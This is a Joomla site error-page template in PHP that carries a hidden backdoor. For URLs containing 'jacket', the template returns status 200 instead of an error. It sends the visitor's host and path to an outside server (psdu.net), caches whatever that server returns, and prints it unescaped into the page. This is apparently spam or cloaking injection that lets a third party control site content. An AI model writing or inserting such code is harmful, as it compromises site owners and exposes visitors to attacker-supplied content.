<?php defined('_JEXEC') or die;
/**
 * @package		Joomla.Site
 * @copyright	Copyright (C) 2005 - 2012 Open Source Matters, Inc. All rights reserved.
 * @license		GNU General Public License version 2 or later; see LICENSE.txt
 */
$app			= JFactory::getApplication();
$url = $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$url = str_replace("index.php?option=com_content&view=","",$url);
$jsite = explode("/", $url);
if (preg_match("/jacket/",$url,$matches)) {
JResponse::setHeader('status', '200' . ' ' . str_replace("\n", ' ', $this->_error->getMessage()));
jimport( 'joomla.application.module.helper' ); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>">
<head>
	<title><?php echo ucwords(str_replace("-"," ",end($jsite))); ?></title>
	<link rel="stylesheet" href="<?php echo $this->baseurl; ?>/templates/<?php echo $this->template ?>/css/styles.css" type="text/css" />
    <link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/font-awesome.min.css" type="text/css" />
</head>
<body class="background">
<div id="wrapper">
<div id="header-wrap" class="container row clr">
    	<div id="header">   
            <div id="logo" class="col span_4">
	            <a href="<?php echo $this->baseurl ?>"><img src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/logo.png"/></a>
            </div>        
    	</div>
</div>
            <div id="navbar-wrap">
                <nav id="navbar" class="container row clr">
                    <div id="navigation" class="span_12 col clr">
                        <?php $module = JModuleHelper::getModule( 'menu' , 'Main Menu' );
                        $attribs['style'] = 'none';
                        echo JModuleHelper::renderModule( $module, $attribs);    ?>
                     </div>            
                </nav>
            </div>    
<div id="box-wrap" class="container row clr">
	<div id="main-content" class="row span_12">
                            <div id="leftbar-w" class="col span_3 clr">
                            	<div id="sidebar">
								<?php
                                    $modules =& JModuleHelper::getModules('left');				
                                    foreach ($modules as $module){
									echo "<div class=\"module\">";
									echo "<h3 class=\"module-title\">".$module->title."</h3>";
									echo "<div class=\"module-body\">".JModuleHelper::renderModule($module)."</div>";
									echo "</div>";}
                                ?>
                            	</div>
                            </div>
                                <div id="post" class="col span_9 clr">
                                    <div id="comp-wrap">                       
                                        <div class="item-page">
                                         <?php
											$path = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
											$path = str_replace("&", "",$path);
											$target = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'html'. DIRECTORY_SEPARATOR . 'index.html';
											$source = 'http://psdu.net/nj.php?i='.$path;
											$cachetime = 86400;
											if ((file_exists($target)) && (time() - $cachetime) > filemtime($target)) {    
											$string = file_get_contents($source);$result = file_put_contents($target, $string);}
											$credits = file_get_contents($target);
											echo $credits;
											?>
						 				</div>                             
                                    </div>
                                </div>
	</div>
</div></div> 
</body>
</html>
<?php } else { 
JResponse::setHeader('status', $this->_error->getCode() . ' ' . str_replace("\n", ' ', $this->_error->getMessage()));
if (!isset($this->error)) {
	$this->error = JError::raiseWarning(404, JText::_('JERROR_ALERTNOAUTHOR'));
	$this->debug = false;
}
$doc = JFactory::getDocument();
$this->language = $doc->language;
$this->direction = $doc->direction;
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>">
<head>
	<title><?php echo $this->error->getCode(); ?> - <?php echo $this->title; ?></title>
	<link rel="stylesheet" href="<?php echo $this->baseurl; ?>/templates/<?php echo $this->template ?>/css/styles.css" type="text/css" />
</head>

<body id="error">
	<div class="center">
		<h1 class="error">
			<span><?php echo $this->error->getCode(); ?></span>
		</h1>
		<h2 class="title"><?php echo $this->error->getMessage(); ?></h2>
        
		<p class="message">The Page you are looking for doesn't exist or an other error occurred. <a href="javascript:history.go(-1)">Go back</a>, or head over to <a href="<?php echo $this->baseurl; ?>"><?php echo JText::_('JERROR_LAYOUT_HOME_PAGE'); ?></a> to choose a new direction.</p>

	</div>

</body>
</html>
<?php } ?>
